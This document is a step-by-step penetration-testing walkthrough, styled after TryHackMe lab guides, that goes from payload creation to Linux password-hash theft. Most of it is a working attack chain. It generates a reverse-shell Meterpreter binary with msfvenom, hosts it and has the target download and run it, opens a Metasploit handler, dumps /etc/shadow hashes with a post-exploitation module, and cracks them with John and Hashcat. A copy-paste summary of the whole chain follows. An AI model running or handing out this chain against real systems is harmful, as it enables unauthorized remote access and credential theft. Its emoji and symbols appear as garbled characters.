
This is written in a **TryHackMe-style, step-by-step penetration testing procedure**, covering:

âœ” Payload creation
âœ” File hosting
âœ” Transfer
âœ” Handler setup
âœ” Meterpreter session
âœ” Post-exploitation hash dumping
âœ” Understanding and extracting the hash

---

# ðŸ› ï¸ **Linux Meterpreter Exploitation â€” Full Procedure**

*(From Payload Creation â†’ Meterpreter â†’ Hash Dumping)*

---

# **ðŸ”¥ Phase 1 â€” Preparation**

## **1. Identify your attacker IP**

On your Kali/AttackBox:

```bash
ip a
```

Find the interface connected to the target (usually `eth0`).

Example:

```
10.201.104.36
```

## **2. Check system architecture (to pick correct payload)**

```bash
uname -m
```

* `x86_64` â†’ 64-bit payload (`linux/x64/...`)
* `i386`/`i686` â†’ 32-bit payload (`linux/x86/...`)

---

# **ðŸ”¥ Phase 2 â€” Select a Free Port**

Choose a port (example: **5555**) and verify nothing is using it:

### Check if the port is free:

```bash
ss -lntp | grep -w 5555
```

* **No output** â†’ port is free âœ”
* **Output showing a process** â†’ port is in use âŒ (choose another)

---

# **ðŸ”¥ Phase 3 â€” Generate the Meterpreter ELF Payload**

On the attacker machine:

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=10.201.104.36 \
  LPORT=5555 \
  -f elf -o rev_shell.elf
```

### Explanation:

* `-p linux/x64/meterpreter_reverse_tcp` â†’ Linux 64-bit Meterpreter payload
* `LHOST` â†’ attackerâ€™s IP
* `LPORT` â†’ listener port
* `-f elf` â†’ output format (Linux binary)
* `-o` â†’ save to file

(Optional sanity check):

```bash
strings rev_shell.elf | egrep "10\.201\.104\.36|5555"
```

---

# **ðŸ”¥ Phase 4 â€” Host Payload with Python HTTP Server**

In the same directory as `rev_shell.elf`:

```bash
python3 -m http.server 9000
```

This hosts your payload so the target can download it.

---

# **ðŸ”¥ Phase 5 â€” Download Payload on Target**

On the target machine:

```bash
wget http://10.201.104.36:9000/rev_shell.elf
ls -la rev_shell.elf
chmod +x rev_shell.elf
```

Now itâ€™s executable and ready to run.

---

# **ðŸ”¥ Phase 6 â€” Start the Metasploit Handler**

In a new terminal on the attacker:

```bash
msfconsole
```

Inside Metasploit:

```text
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set LHOST 10.201.104.36
set LPORT 5555
run
```

You should now see:

```
[*] Started reverse TCP handler on 10.201.104.36:5555
```

---

# **ðŸ”¥ Phase 7 â€” Execute Payload & Gain Meterpreter**

On the target:

```bash
./rev_shell.elf
```

The attackerâ€™s msfconsole should show:

```
[*] Meterpreter session 1 opened
```

Interact with it:

```bash
sessions
sessions -i 1
```

---

# **ðŸ”¥ Phase 8 â€” Dump Linux Password Hashes (Post-Exploitation)**

## **1ï¸âƒ£ Background the session**

Inside meterpreter:

```bash
background
```

## **2ï¸âƒ£ Search for post-exploitation hash modules**

```bash
search type:post platform:linux hash
```

The module you need:

```
post/linux/gather/hashdump
```

## **3ï¸âƒ£ Load the hashdump module**

```bash
use post/linux/gather/hashdump
show options
set SESSION 1
run
```

You should get output like:

```
[+] murphy:$6$qK0K...lxI7b.
[+] claire:$6$Sy0NN...OwtCtQD8r
[+] Unshadowed Password File: /root/.msf4/loot/2025....txt
```

---

# **ðŸ”¥ Phase 9 â€” Understanding the Hash Format**

Linux hashes come from `/etc/shadow`.

Murphyâ€™s hash returned from the module looks like this:

```
$6$qK0Kt4UQSHuCrLoJG$bB5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHpHHeI2JU3m9OBOS7LUkKMADLxCBCywzlxI7b.
```

### Breakdown:

* `$6$` â†’ SHA512crypt
* `$6$salt$hash` â†’ full structure
* Everything after `$6$` is needed for cracking

This is what TryHackMe typically wants when they ask:

ðŸ‘‰ **â€œWhat is the other userâ€™s password hash?â€**

---

# **ðŸ”¥ Phase 10 â€” (Optional) Crack the Hash**

## **Crack with John:**

```bash
echo "$6$qK0Kt4UQS...lxI7b." > murphy.hash
john murphy.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## **Crack with Hashcat (mode 1800):**

```bash
hashcat -m 1800 murphy.hash /usr/share/wordlists/rockyou.txt
```

---

# âœ… **COMPLETE WORKFLOW SUMMARY (Quick Version)**

```bash
# Attacker - Prepare
ip a
uname -m
ss -lntp | grep -w 5555

# Build Payload
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.201.104.36 LPORT=5555 -f elf -o rev_shell.elf

# Host Payload
python3 -m http.server 9000

# Target - Download
wget http://10.201.104.36:9000/rev_shell.elf
chmod +x rev_shell.elf

# Attacker - Handler
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set LHOST 10.201.104.36
set LPORT 5555
run

# Target - Execute
./rev_shell.elf

# Attacker - Hash Dump
background
use post/linux/gather/hashdump
set SESSION 1
run
```

---


